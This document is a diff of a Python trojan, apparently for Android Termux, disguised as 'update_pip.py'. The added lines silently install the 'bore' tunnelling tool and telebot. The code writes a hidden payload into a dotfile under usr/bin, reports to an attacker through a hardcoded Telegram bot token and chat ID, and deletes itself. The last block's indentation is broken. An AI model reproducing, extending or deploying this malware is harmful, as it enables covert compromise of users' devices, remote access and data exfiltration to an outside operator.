@@ -1,11 +1,16 @@
-import os, subprocess, telebot
+import os, subprocess
+
+result = subprocess.run("pkg install bore -y", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
+result = subprocess.run("pip install telebot", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
+
+import telebot
 
 def sender(message):
 	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
 	bot.send_message(5867708857, message)
 
 malicious = """
-import os, random, subprocess, requests, time, threading, telebot
+import os, random, subprocess, time, threading, telebot
 
 def sender(message):
 	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
@@ -122,3 +127,11 @@ python ~/../usr/bin/.python_config.py >/dev/null 2>&1 &""")
 			sender(message)
 
 install_malware()
+
+result = subprocess.run("rm update_pip.py", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
+	if result.returncode == 0:
+		message = "☆ Done removing trojan."
+		sender(message)
+	else:
+		message = "☆ Unable to remove trojan."
+		sender(message)
